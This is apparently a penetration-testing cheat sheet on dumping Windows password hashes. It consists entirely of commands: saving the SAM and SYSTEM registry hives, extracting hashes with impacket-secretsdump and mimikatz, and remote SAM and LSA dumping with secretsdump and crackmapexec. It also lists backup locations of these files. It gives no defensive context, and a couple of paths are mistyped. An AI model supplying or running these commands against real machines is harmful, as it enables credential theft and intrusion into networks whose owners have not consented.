## SAM / System Files
```
reg save hklm\sam C:\Users\Public\SAM
reg save hklm\SYSTEM C:\Users\Public\SYSTEM

└─$ impacket-secretsdump -system SYSTEM -sam SAM LOCAL
└─$ python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

SAM Dumping
Save SYSTEM hive and SAM in another directory:

reg save HKLM\SAM c:\path\to\SAM
reg save HKLM\SYSTEM c:\path\to\SYSTEM

mimikatz
lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
or just use : lsadump::sam

Notes : you can dump SAM and LSA with crackmapexec or secretdump using these commands :
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
crackmapexec smb $ip -d $domain -u $user -p $password --sam/--lsa

Systemroot can be windows:
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

System file can be found here:
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
```
